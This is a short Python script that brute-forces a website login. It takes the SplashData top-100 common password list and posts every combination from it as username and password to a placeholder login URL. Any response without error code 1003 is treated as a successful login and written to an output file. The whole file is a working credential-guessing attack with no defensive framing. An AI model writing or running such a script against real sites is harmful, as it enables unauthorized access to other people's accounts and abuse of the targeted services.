import requests
import json
import time

dicttxt = "SplashData Top100.txt"
resultfile = "output.txt"
with open(dicttxt, 'r') as file:
    data = file.readlines()
with open(resultfile, 'w') as result:
    for i in range(len(data)):
        for j in range(len(data)):
            username = data[i]
            password = data[j]
            headers = {'Content-Type': 'aplication/json'}
            postdata = {"user_name": username[:-1], "user_pwd": password[:-1]}
            website = "https://www.xxx.xyz/index.php/user/login.html"
            try:
                r = requests.post(website, data=postdata)
            except:
                continue
            response = r.text
            if response.find('1003') == -1:
                nameandpwd = username[:-1] + '\t' + password
                print(nameandpwd)
                result.write(nameandpwd)
                break
            time.sleep(0.05)
